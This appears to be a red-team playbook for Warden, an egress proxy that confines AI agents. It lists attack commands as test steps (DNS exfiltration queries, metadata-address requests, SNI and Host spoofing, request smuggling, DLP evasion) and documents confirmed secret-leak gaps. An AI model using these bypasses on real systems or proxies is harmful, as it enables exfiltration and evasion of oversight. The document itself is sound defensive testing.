# Red-team playbook — exploratory verification for Warden

Scripted suites prove the cases someone thought of. This playbook is for an
agent (or person) whose job is to find the cases nobody thought of, against a
stack built from a PR branch. Every confirmed break becomes a scripted
regression scenario in #350/#351, so this document is the feeder for the
deterministic suites, not a replacement for them.

Every attack below has: **goal** · **how** · **expected** (what Warden should
do) · **evidence** (what to capture) · **coverage** (a scripted test that
already exercises it, or "exploratory only").

Ground truth: statements here were validated against a locally built binary
(`warden run --local-only`, branch state as of this file's commit) — see the
[dry-run report](#61-dry-run-report-2026-10-16) at the end. Attacks that could
not be validated locally are marked.

## Running today, without `make e2e-up`

#351 (L2 compose stack) does not exist yet. Until it lands, every
CONNECT/policy/scan attack below runs against a local binary:

```sh
# 1. build + bake-once CA (never commit the key)
go build -o warden ./cmd/proxy
OUT_DIR=/tmp/rt-certs scripts/gen-certs.sh

# 2. config: static allowlist + one canary secret (canary values ONLY)
cat > /tmp/rt-config.yaml <<'EOF'
policy:
  allowlist:
    - domain: httpbin.org
    - domain: example.com
secrets:
  - placeholder: rt_canary_secret_001
    envVar: RT_CANARY_SECRET   # any canary value; never a real credential
logging:
  level: debug
  format: json
EOF

# 2b. hardened config: same policy, scanning actually ON. Every attack below
#     that says "with enforce on" means THIS file, not the default one.
#     Note `responseScan.enabled: true` is required — `mode: enforce` alone does
#     nothing (the whole feature is gated by `enabled`, default false:
#     internal/config/responsescan.go). dlp.mode gates the DLP stage by itself.
cat > /tmp/rt-config-hardened.yaml <<'EOF'
policy:
  allowlist:
    - domain: httpbin.org
    - domain: example.com
secrets:
  - placeholder: rt_canary_secret_001
    envVar: RT_CANARY_SECRET
responseScan:
  enabled: true
  mode: enforce
  evidence: true                   # masked last-4 + length in events, never raw
dlp:
  mode: enforce
  classes:
    credentials:
      action: redact
logging:
  level: debug
  format: json
EOF

# 3. run on non-default ports (do not collide with a real proxy)
export RT_CANARY_SECRET='AKIARTX7Q2M9ZPK4R8W2'   # high-entropy canary, never a
                                                  # real credential. Shape note:
                                                  # with the DEFAULT config no
                                                  # scanner runs at all, so this
                                                  # trips nothing; only the
                                                  # hardened config (2b) enables
                                                  # the aws_access_key detector
                                                  # this AKIA… shape is built to
                                                  # trip.
./warden run --config=/tmp/rt-config.yaml --listen 127.0.0.1:58080 \
  --admin-listen 127.0.0.1:59090 --db /tmp/rt-warden.db \
  --ca-cert /tmp/rt-certs/proxy-ca.crt --ca-key /tmp/rt-certs/proxy-ca.key \
  --local-only &

# 4. drive traffic (curl defaults to h2 via ALPN — see the h2 caveat in §2.5)
curl --http1.1 --cacert /tmp/rt-certs/proxy-ca.crt -x http://127.0.0.1:58080 \
  https://httpbin.org/get

# 5. ECHO CHECK — run it on BOTH protocol versions, every run. The swap is
#    visible upstream in what httpbin.org/headers reflects back:
curl --http1.1 --cacert /tmp/rt-certs/proxy-ca.crt -x http://127.0.0.1:58080 \
  -H 'Authorization: Bearer rt_canary_secret_001' https://httpbin.org/headers
curl --cacert /tmp/rt-certs/proxy-ca.crt -x http://127.0.0.1:58080 \
  -H 'Authorization: Bearer rt_canary_secret_001' https://httpbin.org/headers
#    Default config: BOTH return 200 and hand the real canary to the caller
#    (#389). Hardened config: the h1 request is blocked (502 +
#    `http_response_leak`), but the h2 request STILL returns 200 with the real
#    canary — the enforce mitigation holds on h1 ONLY. An h2 leak here is a
#    known break, not a passing check: #388 (h2 skips the stages) + #389.

# 6. hunt the canary in every sink (§3), then stop what you started — by PID
kill <pid>   # find it: ss -ltnp | grep 58080
```

Only public test hosts (httpbin.org, example.com) and canary secrets. Network
isolation attacks (§2.1) need the #351 container topology; everything else
works with the local binary.

---

## 1. Rules of engagement

- **Scope.** Run only against the local #351 stack (`make e2e-up`, requires
  #351) or the L1 harness (#350). Until #351 exists: a local
  `warden run --local-only` binary as shown above. Never against real hosts,
  real credentials, or anything reachable by other people.
- **Canaries only.** Every secret planted in the source is a canary value
  (recognizable, high-entropy, e.g. `AKIARTX7Q2M9ZP…`). If a canary shows up
  anywhere it should not, that is a finding, not a spill.
- **Budget.** Set a time budget (~30 min) and a request budget (~200 requests)
  per run. **Stop at the first critical finding** and report it (§6) — do not
  keep attacking a broken proxy.
- **Never move the gates.** Do not edit policy, gates, or protected paths
  (#354) to make an attack "work". The defense under test must be the
  branch-under-test's own configuration.
- **Clean up.** Stop every process you start, by PID. Delete temp configs and
  DBs. The harness agent network (with #351) is torn down by `make e2e-down`.
- **Report everything.** A defense that held with a confusing UX (e.g. a 200
  CONNECT that can't carry data) is a finding candidate too (§6).

---

## 2. Bypass list — egress isolation and default-deny

### 2.1 Leaving the agent network

These test container/network isolation, so they need the #351 topology
(agent container on an `internal` network whose only egress is the proxy).

| Attack | How | Expected | Evidence | Coverage |
|---|---|---|---|---|
| Direct public IP, proxy bypassed | From the agent container: `curl --noproxy '*' https://example.com` | Connection times out (no route out of the internal network). Nothing bypasses the proxy by not using it. | `curl` exit code + timeout; capture from inside the container | requires #351 · exploratory only |
| DNS exfiltration / raw resolver | From the agent container: `dig @1.1.1.1 <data>.example.com`, then TCP DNS (`dig +tcp`) | UDP/TCP 53 to the world times out. Only the proxy-facing resolver answers. | `dig` output; tcpdump on the egress veth if available | requires #351 · exploratory only |
| IPv6 destination | From the agent container: `curl -6 https://example.com` | Times out; Warden's default-deny applies to v6 exactly like v4 ( SafeDialer filters `::1`, `::ffff:0:0/96`, private v6 — `internal/proxy/safedial.go` `blockedNets`) | `curl` exit code | unit: `TestIsPrivateIP_*`, `TestSafeDialer_BlocksAll_Error` · network path requires #351 |
| Cloud metadata address | `curl -x $WARDEN http://169.254.169.254/…` and CONNECT-form `https://169.254.169.254/` | CONNECT refused (403) or the tunnel carries nothing; `metadata.google.internal` (the denied-hostname list in `safedial.go`) returns 502. Observed live: 403 at policy NoMatch; under an allow-all policy the CONNECT answers 200 but the SafeDialer dial is refused and the tunnel dies (see dry run C). | Body of the 403/502; `egress decision` log line; events table row | unit: `TestIsPrivateIP_CloudMetadata`, `TestSafeDialer_MetadataHostnameBlocked` |
| Docker host gateway | `curl -x $WARDEN https://172.17.0.1/` | Same as metadata: refused/502, never a connection to the host | Log + events row | unit: `TestIsPrivateIP_Private192` family · dial-time part exploratory |
| Control plane + worker admin/dashboard ports from the agent network | `curl https://control-plane:7070/healthz`, `curl http://warden:9090/dashboard/`, and the admin port of any other worker | Unreachable from the agent network (network isolation), and the control plane requires a bearer token (`policyserver.go` token check) even if reached | `curl` exit; 401 body if network-reachable | requires #351 · exploratory only |
| Another worker's network | With a second worker up (#351: `worker-2`): `curl -x $WARDEN http://worker-2:8080/healthz` | Unreachable; worker networks are per-worker | `curl` exit | requires #351 · exploratory only |

### 2.2 CONNECT tricks

All validated live (dry runs A and C). `SplitHostPort` +
`policy.Evaluator.Evaluate` (`internal/policy/policy.go`) +
`SafeDialer` (`internal/proxy/safedial.go`) are the code under test.

| Attack | How | Expected | Evidence | Coverage |
|---|---|---|---|---|
| Allowed host, non-allowed port | `curl --http1.1 -x $P https://httpbin.org:8080/get` (also :0, :99999, :9) | 403. An allowlist entry without an explicit `port:` matches only the scheme's default port (`inferredPort`, `policy.go`) | `%{http_connect}` (the 403 lives on the CONNECT — `%{http_code}` prints 000 because the tunnel never opens); `egress decision … decision:deny protocol:tcp` log + events row | unit: `TestEvaluate_PortInferenceHTTPS`, `TestEvaluate_ExplicitPort` |
| IP literals | `curl -x $P https://93.184.216.34/` (example.com's IP) | 403 NoMatch (policy matches names, not IPs) | events row `domain=93.184.216.34 decision=deny` | unit: `TestEvaluate_DefaultDeny` · integration: `TestE2E_NonAllowlistedBlocked` |
| Obfuscated IP forms | CONNECT `2130706433:443` (decimal), `0177.0.0.1` (octal), `0x7f000001` (hex) | 403: `parseObfuscatedIPv4` (`safedial.go`) decodes all inet_aton forms and SafeDialer refuses private results | unit tests block each form | unit: `TestParseObfuscatedIPv4`, `TestSafeDialer_ObfuscatedIPv4_Blocked` |
| Trailing dot / mixed case | `curl -x $P https://HTTPBIN.ORG./get` (note the dot) | Allowed — same host: `Evaluate` trims one trailing dot and lowercases (`policy.go`); live run: 200 | 200 + allow event | unit: `TestEvaluate_CaseInsensitiveAndTrailingDot` |
| IDN / punycode look-alikes | `curl -x $P https://xn--httpbin-8z1f.org/` | 403 NoMatch (exact-name policy; look-alike names never match) | events row | exploratory only |
| Very long / malformed CONNECT lines | Raw socket (python `socket`): a 64 KB target, a 10 MB CONNECT line, `CONNECT host:443` with no HTTP version | Malformed → dropped + `unsupported_protocol`/`malformed_connect` deny (`serve.go handleConn`). 10 MB line → 403 but fully buffered first — resource finding RT-3, [#390](https://github.com/ethosagent/warden/issues/390) | Log `msg:"egress decision" decision:deny protocol:tcp`; events rows | unit: `TestServe_InvalidCONNECT`, `TestServe_NonConnectLoggedDeny` (long-line case exploratory only) |
| Oversized header block on CONNECT | Raw socket: 2000 × 512 B headers after CONNECT | Headers are consumed unbounded (`serve.go` header loop) and the CONNECT proceeds per policy — same resource finding, [#390](https://github.com/ethosagent/warden/issues/390) | Conn proceeds or 403; RSS delta of the worker process | exploratory only |
| Userinfo in CONNECT host | CONNECT `google.com@127.0.0.1:443` | 403: `canonicalizeHost` (`safedial.go`) rejects hosts containing `@` | unit test | unit: `TestSafeDialer_UserinfoRejected` |

### 2.3 Host confusion after TLS

The MITM leaf is minted for the CONNECT-time domain only
(`internal/proxy/tls.go` `mintLeaf`, `DNSNames: []string{domain}`), and
`readRequest` (`internal/proxy/http.go`) rechecks the inner `Host` against the
CONNECT domain.

| Attack | How | Expected | Evidence | Coverage |
|---|---|---|---|---|
| SNI ≠ CONNECT host | Raw CONNECT `httpbin.org:443`, TLS with SNI `evil.example.com`, then `GET /` | The check that always holds: **no request reaches the other host, whatever the client does.** Warden ignores the client's SNI and presents a leaf minted for the CONNECT domain only (`mintLeaf`, `DNSNames: []string{domain}`). A *verifying* client fails the handshake (SNI `evil.example.com` does not match the presented cert) and sends nothing. A *non-verifying* client completes the handshake, but the session is still bound to `httpbin.org`: the inner `Host`/URI recheck (`readRequest`) ends the connection if it names another host. | With verification: `ssl` handshake error listing the mismatch. Either way: leaf cert dump (`openssl s_client`) shows SAN=CONNECT domain only; no upstream bytes to the other host | exploratory only (design check: `mintLeaf`) |
| Host header changed mid-connection | CONNECT `httpbin.org:443`, valid TLS, inner `Host: evil.example.com` | Session ends silently; nothing forwarded (`readRequest` recheck) | No upstream bytes; no allow event for a second host; conn closed | unit: `TestTLS_HostHeaderRecheck` |
| HTTP/2 connection coalescing | Reuse an h2 connection and send a second `:authority` (requires #351 client tooling) | Warden terminates h2 per-CONNECT (`handleGRPC`); a second `:authority` must be rejected like the h1 recheck. **Not yet validated** — the h2 path's parity gaps are finding RT-2; treat any success as critical | h2 frame dump; per-request events | exploratory only |
| Absolute-form request URI | Inner `GET https://evil.example.com/get HTTP/1.1` (Host stays httpbin.org) | Session ends (host recheck compares the URI's host); live run: nothing forwarded | No upstream request; conn closed | exploratory only (same `readRequest` path as the Host recheck) |

### 2.4 DNS rebinding

| Attack | How | Expected | Evidence | Coverage |
|---|---|---|---|---|
| Allowed name resolving to loopback/private | Add the name to the allowlist first — it is NOT in the quickstart config, and an unlisted name is denied at policy (403) before the SafeDialer is ever reached, which silently turns this attack into a plain default-deny check. Config for this row: append `- domain: 127.0.0.1.nip.io` to the `allowlist` (resolving it needs **outbound DNS** to the public `nip.io` nameservers — the quickstart binary uses the host resolver, the #351 agent network must have a resolver that answers public names). Then: `curl -x $P https://127.0.0.1.nip.io/` (public DNS name → 127.0.0.1) | CONNECT passes policy (name matches), then the SafeDialer **dial** is refused → in-tunnel 502. Observed live under a static allowlist and under allow-all. Audit note (RT-4, [#391](https://github.com/ethosagent/warden/issues/391)): the dial refusal never records a deny event — and on the MITM path (the quickstart setup, CA terminated) the request records **nothing at all**: replayed 2026-10-16, the events DB has zero rows for it. A CONNECT-`allow` is audited only on the raw-tunnel (no-CA) paths — stored pre-dial in `serve.go`, post-dial in `tls.go`'s peek path — so there the refusal shows up as a bare `allow` whose tunnel died. Either way a refusal is invisible as a block until #391 lands. | Body `Bad Gateway`; on the MITM path: no event rows for the request (that absence IS the evidence); no upstream connection in the worker's logs | unit: `TestSafeDialer_BlocksAll_Error`, `TestIsPrivateIP_*` · dial-over-TLS path exploratory only |

### 2.5 Protocol paths that skip stages

The HTTP/1.1 path runs `runRequestStages` (`internal/proxy/http.go`):
readRequest → judgeGate → mcpRequestScan → dlpScan → swapSecrets →
applyTransforms → forward → relayResponse. Every other protocol path is a
potential parity gap. This is the section most likely to find something.

| Attack | How | Expected | Evidence | Coverage |
|---|---|---|---|---|
| HTTP/2 / gRPC streams | h2 client through the proxy (ALPN `h2`) | **Parity gap confirmed (RT-2, [#388](https://github.com/ethosagent/warden/issues/388)).** h2 is served by `serveGRPCStream` (`grpc.go`), which swaps placeholders in METADATA only and does not run `runRequestStages`: policy and SafeDialer still gate the CONNECT, but body/query swap, DLP, MCP scan, judge, response scan, and the 10 MB body cap do not apply. Consequence for the echo check (§3): the `responseScan` enforce mitigation holds on **h1 only** — on h2 an echo response hands the real swapped secret straight back (known break, [#388](https://github.com/ethosagent/warden/issues/388) + [#389](https://github.com/ethosagent/warden/issues/389)). Until fixed, never treat an h1 scan/enforce result as covering h2; run both. | Compare h1 vs h2 for the same request; stage-parity checklist per path | unit: `TestGRPC_SecretSwapAndForward`, `TestHTTP2_BasicAuthSwap`, `TestGRPC_NonGRPCHTTP2Protocol` (metadata swap only) · full-chain parity exploratory only |
| WebSocket upgrade | `websocat`/`curl` upgrade through the proxy (requires #351 upstream) | Not an opaque relay. Policy and SafeDialer gate the CONNECT/upgrade exactly like any tunnel; after the upstream's 101, `handleWSUpgrade` (`internal/proxy/ws.go`) hands both directions to the frame pump (`ws.Pump`, `internal/mcp/ws`), which relays frames and scans every JSON-RPC **text** message in both directions through the MCP gateway. If the live gateway cannot scan WS and MCP mode is enforce, the upgrade fails closed (502, `mcp_ws_unscannable`, deny event); in monitor/off the frames pass unscanned with a one-time WARN. The whole session is audited as ONE allow/deny event (`protocol: mcp`). Verify: policy decision on the upgrade, MCP scan findings on the frames, and that audit event. **Not validated locally** (no safe public WS upstream). | Upgrade response; per-frame scan findings; single `mcp` events row | end-to-end exploratory only · unit: `TestPump_EnforceDeniedClientCall`, `TestPump_MonitorForwardsAndScans`, `TestWS_EnforceFailsClosedWithoutScanCapability` |
| SSE and MCP streams | Streamed responses through the proxy (requires #351 MCP upstream; `examples/mcp-wedge` needs Docker) | SSE `text/event-stream` is non-scannable by design (`scannableContentType`) — DLP flags partial and forwards (live code check: `http.go` `dlpScan`). MCP tool calls must hit `mcpRequestScan`. **Not validated end-to-end locally.** | Events with `dlp_partial`; MCP tool events | unit: `TestDLP_NonScannableSkipped` · MCP chain exploratory only |

### 2.6 Request smuggling

Observed live (dry run A) via raw sockets over an established tunnel.

| Attack | How | Expected | Evidence | Coverage |
|---|---|---|---|---|
| CL + TE conflict | Inner `POST /post` with `Content-Length: 5` + `Transfer-Encoding: chunked`, smuggled second request in the body | Go's http stack normalizes the conflict: exactly one clean request is forwarded. A smuggled second request — if the upstream serves it — is sent to the **same pinned host** (no cross-host pivot) and audited as its own event. | Upstream echo shows one request; second request's events row has the same domain | exploratory only |
| Duplicate conflicting Content-Length | `Content-Length: 5` + `Content-Length: 15` | Connection closed silently; nothing ambiguous forwarded | Conn close; no partial upstream request | exploratory only |
| Header obfuscation | `Transfer-Encoding: chunked` with spaces/`x:` prefix variants | Same normalization as above; treat any desync upstream as critical | Upstream echo | exploratory only |

### 2.7 Redirects

| Attack | How | Expected | Evidence | Coverage |
|---|---|---|---|---|
| Allowed upstream redirects to a non-allowed host | `curl -sL -x $P 'https://httpbin.org/redirect-to?url=https://google.com/&status_code=302'` | The follow-up CONNECT to google.com is denied: the agent follows the redirect itself, so Warden gates each hop independently. Live run: `httpbin.org … allow` then `google.com … deny protocol:tcp`, curl exit 7. | Both events rows (allow + deny) | exploratory only (mechanism is `TestE2E_NonAllowlistedBlocked`) |

### 2.8 Fail-closed

| Attack | How | Expected | Evidence | Coverage |
|---|---|---|---|---|
| Control plane dies mid-run | Managed worker (`controlPlane:` config) against `warden control-plane`; `kill` the CP; re-test | Worker logs `control plane long-poll failed; keeping last-known policy`; last-known-good keeps working; nothing new becomes allowed. Live: allowed host 200, never-allowed hosts still denied after CP death. | Worker log lines; before/after curl codes | unit: `TestRemoteProvider_Unreachable`, `TestRemoteProvider_InvalidJSON` (`internal/config/remote_test.go`) · live-chain exploratory only |
| Worker boots with CP unreachable | Start the worker before the CP | Boot is fail-closed: `control plane unreachable at boot; starting FAIL-CLOSED (deny all) until policy arrives`; everything 403 until a valid policy arrives | Boot log; curl 403s | live-verified (dry run D) · exploratory |
| Corrupt policy wire | Fake CP serving garbage at `/policy` (python https server; note the wire is **JSON** — `internal/config/remote.go` `remoteWire`) | Decode/validation error logged (`decode json: …`), last-known-good kept; a worker that never saw a valid policy stays deny-all. Live: verified both orders. | Worker log; curl codes before/after | unit: `internal/config/remote_test.go` parse/validation tests |
| Judge / LLM-policy timeout or error | Requires the judge enabled (needs an LLM backend — not runnable locally) | A judge error/timeout must deny (fail closed), never allow; no secret material in judge prompts (§3) | Judge decision logs | requires LLM backend · exploratory only |
| Analytics store unavailable | `--db` pointing at an unwritable path | **Boot refused**: `analytics: migrate: unable to open database file` — no service without its audit sink. Mid-run disk-full behavior not yet tested (`StoreEvent` errors are swallowed in hot-path calls — check events keep flowing at the next restart). | Boot error output | live-verified (dry run F) · mid-run case exploratory |

---

## 3. Canary hunt (secrets never reach the agent)

**Procedure** (one pass per run, after driving §2 traffic):

1. Plant one canary per secret mapping (`rt_canary_secret_001` →
   `RT_CANARY_SECRET=<canary>`). Use canary values with detector-friendly
   shapes (`AKIA…`, `ghp_…`) so scan findings fire on them.
2. Drive allowed **and** denied traffic, errors, and timeouts across every
   protocol path you can reach (h1, h2/gRPC, and with #351: WS/SSE/MCP).
3. Search every sink for the canary — raw, base64, URL-encoded, hex, and
   split across chunks:
   ```sh
   grep -rE '<canary>|$(printf '<canary>' | base64 -w0)' \
     warden.db warden-alerts.db cp-fleet.db /var/log/warden*.log
   python3 -Ic "import sqlite3, glob
   for f in glob.glob('*.db'):
       for (name,) in sqlite3.connect(f).execute(\"SELECT name FROM sqlite_master WHERE type='table'\"):
           for row in sqlite3.connect(f).execute(f'SELECT * FROM {name}'):
               if any('<canary>' in str(c) for c in row): print(f, name, row)"
   ```
   Also check: agent-visible responses and **proxy-generated error pages**;
   worker + CP logs; decision events and analytics rows; dashboard/API
   responses (`/dashboard/`, `/admin/`, `/central/ingest`, `/metrics`);
   metrics labels; the SQLite files on disk; judge/LLM-policy prompts; crash
   output.
4. One place the canary **must** exist: the worker process environment (the
   secret source itself, `/proc/<pid>/environ`) — that is the design, not a
   leak. Everything else must be clean.

**Placeholder abuse** (swap directions — `swapSecrets`, `swapBasicAuth`,
`internal/proxy/http.go`):

| Attack | How | Expected | Evidence | Coverage |
|---|---|---|---|---|
| Placeholder in query / body / unexpected header on an allowed host | `?q=rt_canary_secret_001`, JSON body, `X-Junk: rt_canary_secret_001` | Swapped on h1 (header, query, body all swap live-verified); response must not carry the real value back — **upstream echo is the check**: `httpbin.org/headers` reflects the header. Run the echo check on **both protocol versions** (`--http1.1` AND curl's default h2). Default config: both echo the **real canary back to the agent** (RT-1, [#389](https://github.com/ethosagent/warden/issues/389)). Hardened config (`responseScan: {enabled: true, mode: enforce}`): h1 blocked (502, `http_response_leak`, masked evidence) but **h2 is not scanned and still leaks** — the enforce mitigation holds on h1 only (known break: [#388](https://github.com/ethosagent/warden/issues/388) + [#389](https://github.com/ethosagent/warden/issues/389)); an h2 leak is a confirmed break to report as already-tracked, not a new finding. Detector shape note: only the hardened config turns on any scanner, so a plain AKIA-shaped canary "tripping aws_access_key" is a claim about the hardened config, never the default one. | Echo response body (searched for canary) on h1 AND h2; on h1 + hardened config, deny event `reason=http_response_leak` with masked evidence `••••••••<last4> (len N)` | integration: `TestE2E_SecretSwapped` · unit: `TestHTTP_SecretSwapInHeaders/Query/Body` · echo direction exploratory only |
| Basic-auth placeholder | `-u rt_canary_secret_001:x` through an echo upstream | `swapBasicAuth` decodes and swaps only the destination `Authorization` (never `Proxy-Authorization`); same echo caveat as above (RT-1, [#389](https://github.com/ethosagent/warden/issues/389)) | Echoed `Authorization` searched for canary | unit: `TestHTTP2_BasicAuthSwap` (h2 metadata path) |
| Unknown placeholder-shaped strings | `rt_never_mapped_999` in header/body | Passed through literally (no mapping → no swap) — never an error, never a swap toward an attacker path | Upstream echo shows the literal string | unit: `TestHTTP_NoSwapWithoutPlaceholders` |
| Placeholders toward non-allowed hosts | Canary in a request to a denied host | Request never leaves (403); the deny event carries no header/body content | Deny event fields only (`domain/port/decision`) | integration: `TestE2E_NonAllowlistedBlocked` |

---

## 4. Content-scan evasion (DLP, injection and MCP scanning)

All validated live with the hardened config from "Running today" —
`responseScan: {enabled: true, mode: enforce}` (note `enabled`; `mode: enforce`
alone is inert) + `dlp: {mode: enforce}` — dry run B. Code:
`internal/proxy/dlp.go`, `internal/proxy/http.go`
(`dlpScan` fail-open gate), `internal/proxy/response_scan.go`. All of §4 is h1
only: the h2 path runs none of these stages ([#388](https://github.com/ethosagent/warden/issues/388)).

| Attack | How | Expected | Evidence | Coverage |
|---|---|---|---|---|
| Response leak, high-severity shape | Upstream echoes a credential-shaped canary back; agent reads the response | In enforce: response blocked (502), deny event `reason=http_response_leak` with masked evidence. PII/low-severity findings are logged but **never block** (only `credential_leak`/`injection` at severity high block — `response_scan.go Scan`). | `egress decision … decision:deny`; masked evidence | unit: `TestResponseScan_EnforceBlocksLeak`, `TestResponseScan_MonitorForwardsAndLogsLeak` (`http_response_scan_test.go`) |
| Plain credential in request body | `{"auth":"secret=<34 chars>"}` to an echo upstream | Enforce redact: upstream receives `[REDACTED:credentials]`; event carries `dlp_action=redact`, `dlp_rule=classes[credentials]`, masked evidence | Upstream echo of the redacted body | unit: `TestDLP_EnforceRedactsInline`, `TestDLP_MonitorDowngradeRecordsWouldBe` |
| Base64-encoded credential in body | Base64 of a credential, ≥ 64 chars (the decoder's minimum block size — `decodeBase64Blocks`, `internal/scan/scan.go`) | Scanner decodes the block, policy asks redact, the span can't be located in the raw body → **fail-closed 403**, event `dlp_encoded=1`, `reason=dlp_redact`. Live-verified. A short (<64 chars) encoding is not decoded — pass-through (see below). | 403; event `dlp_encoded=1` | exploratory only |
| Encodings below the decode threshold / gzip / multipart | gzip-compressed body; multipart; `Content-Type: application/gzip` | Not decodable → **forwarded unscanned by design**, event flagged `dlp_partial=1` (the honest-coverage flag; `http.go` non-scannable + unknown-length branches). In enforce mode this is still a forward — know this gap when you write policy. | Event `dlp_partial=1`; upstream echo shows original bytes | unit: `TestDLP_NonScannableSkipped`, `TestDLP_OverCapForwardsNot413`, `TestDLP_UnknownLengthForwards` |
| Chunked request body | `Transfer-Encoding: chunked` with a credential body | ContentLength < 0 → body never read → forwarded **unredacted**, `dlp_partial=1` (live-verified in enforce). The response echo still gets scanned (leaks only if severity < high). | Event `dlp_partial=1`; upstream echo raw | unit: `TestDLP_UnknownLengthForwards` |
| Body just over the scan cap | 1 MB + 1 KB body | First 1 MB scanned, rest skipped, forwarded, `dlp_partial=1`. (The hard 413 lives at the 10 MB swap cap: `TestHTTP_OversizeBody413` / `TestDLP_SwapContractStill413s`.) | Event `dlp_partial=1` | unit: `TestDLP_OverCapPartial` |
| Split payload across chunks/frames | Credential split across TCP segments / h2 DATA frames | Regex scanning operates on the assembled body; splitting across **requests** evades by design — check whether your policy tolerates that (it must be a conscious decision, not an accident) | n/a | exploratory only |
| Unicode tricks | Homoglyph/full-width substitutions of a credential | Regex detectors do not normalize Unicode — expect evasion; treat as a known scanner limitation, not a new finding, unless a class was claimed as covered | Detection events (absent) | exploratory only |
| MCP tool calls, nested/batched JSON-RPC | Requires the MCP subsystem + #351 upstream (`examples/mcp-wedge` needs Docker) | `mcpRequestScan` must inspect nested/batched payloads; poisoned tool descriptions must surface in MCP events | MCP tool events, scan findings | requires #351/Docker · exploratory only |

---

## 5. New-endpoint abuse (derived from each PR's diff)

Run this against every route and config key the PR adds or changes. This is a
checklist, not a script — each line needs the PR's actual routes.

- [ ] **Authentication required** — hit the new route with no token, an empty
  token, and the wrong token; expect 401 everywhere (`policyserver.go` is the
  reference implementation).
- [ ] **Role/scope enforced** — a worker-scoped token must not fetch
  fleet-wide resources; another worker's ID must 404/403.
- [ ] **CSRF on browser routes** — dashboard/state-dir edit endpoints reject
  cross-origin POSTs.
- [ ] **IDOR** — enumerate IDs (`/workers/{id}`, event IDs): another worker's
  objects must not resolve.
- [ ] **Oversized bodies and pagination** — POST a 10 MB body to the new
  route; request `?limit=1000000`; expect caps, not OOM.
- [ ] **Rate limits** — hammer the new route; expect the limiter, not a hang.
- [ ] **Path traversal in IDs** — `/foo/../../etc`, `%2e%2e%2f`, embedded NUL:
  expect 4xx, never a file.
- [ ] **SSRF** — any caller-supplied URL must go through the SSRF-safe client
  (`safedial.go`); fetch endpoints must refuse private/loopback/metadata.
- [ ] **Error messages leak internals** — trigger errors; look for file
  paths, SQL, stack traces, config values.
- [ ] **Audit record written** — every state change on the new route writes
  an event; deny-worthy requests write deny events.
- [ ] **New config keys** — can a worker receive control-plane-only values
  over the policy wire (`remoteWire.settings`)? What happens with unsafe
  values (negative sizes, empty strings, unknown enum values)? The worker
  must validate on receipt, not trust the CP.

---

## 6. Reporting and ratchet

**Findings** use the shared format from
[`.agents/reviews/README.md`](../reviews/README.md) with lens `red-team` and
stable IDs `RT-*`:

```json
{
  "lens": "red-team",
  "rule": "RT-2",
  "severity": "high",
  "file": "internal/proxy/grpc.go",
  "line": 89,
  "issue": "h2/gRPC path skips runRequestStages",
  "evidence": "stage-parity checklist §2.5, dry run A",
  "suggestion": "route h2 through the same stage chain or enforce per-stage parity in serveGRPCStream"
}
```

**Severity** (same scale as the review README):

- **critical** — egress bypass, a real secret reaching the agent, fail-open.
  **Stop the run at the first critical and report it.**
- **high** — auth/scope bypass, cross-tenant/cross-worker access, a stage
  silently missing on a supported protocol path.
- **medium / low** — resource exhaustion, audit-trail gaps, confusing
  fail-closed UX.

**Ratchet.** Every confirmed finding gets a scripted regression scenario in
#350 (L1) or #351 (L2) **in the same fix PR**. The coverage columns above name
today's tests; when #350/#351 land, map each still-"exploratory" attack to a
scenario name here so future runs spend time on what isn't covered yet.

## 6.1 Dry-run report (2026-10-16)

Validated against a locally built binary (all runs local-only, canary-only
secrets, public test hosts httpbin.org/example.com, non-default ports
58080–58086/59090–59096, every process stopped by PID). Runs: **A** static
allowlist + MITM; **B** hardened responseScan/DLP enforce (the "2b" config
above); **C** allow-all policy; **D** control plane + managed worker + fake-CP
corrupt wire; **E** redirect chain; **F** unwritable analytics DB. Defenses
that held are the *expected* columns above. Findings:

| ID | Sev | Area | Summary (all four are public issues; repros below are canary-only, safe to rerun) |
|---|---|---|---|
| RT-1 | high | secrets | [#389](https://github.com/ethosagent/warden/issues/389). With default `responseScan: off`, an upstream that echoes request headers hands the **real** swapped secret back to the agent. Repro: allowlist `httpbin.org`, one placeholder → canary secret, then `curl --http1.1 -x $P -H 'Authorization: Bearer rt_canary_secret_001' https://httpbin.org/headers` — the response body contains `Bearer <real value>`. Query, body and Basic-auth swaps leak the same way. Mitigation exists but is partial and off by default: the hardened config (`responseScan.enabled: true` + `mode: enforce`) blocks it on **h1 only** (502 + `http_response_leak`); h2 is not scanned and still leaks (via RT-2/#388). The owner decides whether the default should change. |
| RT-2 | high | stage parity | [#388](https://github.com/ethosagent/warden/issues/388). The h2/gRPC path (`serveGRPCStream`) skips `runRequestStages`: body/query swap, DLP, MCP scan, judge, response scan and the 10 MB body cap do not apply to h2 traffic. Policy + SafeDialer still gate the CONNECT. Repro: with `dlp.mode: enforce` + a `credentials` redact class, `POST` `{"auth":"secret=<credential-shaped canary>"}` to `httpbin.org/post` — h1 upstream receives `[REDACTED:credentials]`, h2 upstream receives the credential unchanged, no DLP event. Same shape as the h2 echo leak above. |
| RT-3 | medium | resource | [#390](https://github.com/ethosagent/warden/issues/390). `serve.go handleConn` buffers the CONNECT request line and headers unbounded (`ReadString`) before rejecting — a 10 MB CONNECT line is fully buffered to return 403; a 2000 × 512 B header block is likewise fully consumed before the CONNECT proceeds per policy. |
| RT-4 | low | audit | [#391](https://github.com/ethosagent/warden/issues/391). Dial-time SafeDialer refusals (blocked nets, denied hostnames) produce an in-tunnel 502 but **no** deny event. Operators see the block only in proxy logs. Repro (re-verified 2026-10-16): allowlist `127.0.0.1.nip.io` (needs outbound DNS), request it → 502 in the tunnel; on the MITM path the events DB records **zero** rows for the request (no deny, and no CONNECT `allow` either — that audit lives on the raw-tunnel path only). |

Not run (and why): network-level isolation and cross-worker attacks (need
#351's compose topology — Docker unavailable for this dry run); WebSocket/SSE/
MCP end-to-end (no safe local upstream; `examples/mcp-wedge` needs Docker);
judge fail-closed (needs an LLM backend); mid-run analytics loss (boot-time
case verified; the mid-run path needs a fault-injection harness).

---

*Grounding: file/function names above were confirmed on this branch —
`internal/proxy/serve.go` `handleConn`, `internal/proxy/tls.go` `mintLeaf`,
`internal/proxy/http.go` `readRequest`/`runRequestStages`/`dlpScan`,
`internal/proxy/grpc.go` `serveGRPCStream`, `internal/proxy/ws.go`
`handleWSUpgrade`, `internal/mcp/ws` `Pump`, `internal/proxy/safedial.go`
`SafeDialer`/`parseObfuscatedIPv4`/`canonicalizeHost`, `internal/proxy/dlp.go`
`DLPScanner`, `internal/proxy/response_scan.go` `ResponseScanner.Scan`,
`internal/config/responsescan.go` `ResponseScanConfig`,
